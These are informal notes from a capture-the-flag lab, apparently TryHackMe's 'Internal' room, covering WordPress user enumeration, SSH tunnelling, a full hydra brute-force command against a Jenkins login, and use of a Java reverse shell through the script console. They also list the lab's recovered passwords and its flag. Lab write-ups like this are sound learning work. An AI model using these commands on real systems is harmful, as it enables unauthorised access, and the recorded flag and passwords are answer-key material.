in phpmyadmin/index.php we find out that it has error based 
its all errors

by adding ip to /etc/hosts
we can use wpscan and enumirate users

admin:my2boys

ssh tunneling ?!
how does this work?..
ssh -L 8080:docker-ip:8080 aubreanna@internal

netstat -tlnp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)

ssh -L 127.0.0.1:80:intra.example.com:80 gw.example.com
we used hydra:
hydra -s 8080 10.10.131.184 http-form-post “/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:Invalid username or password” -L user.txt -P rockyou.txt -t 10 -w 30

we found pass spongebob

we used /script to open script console 
and pasted Java reverse shell
we found /opt/notes.txt and there was:
root:tr0ub13guM!@#123
THM{d0ck3r_d3str0y3r}

it was too hard i need to learn something about ssh tunneling
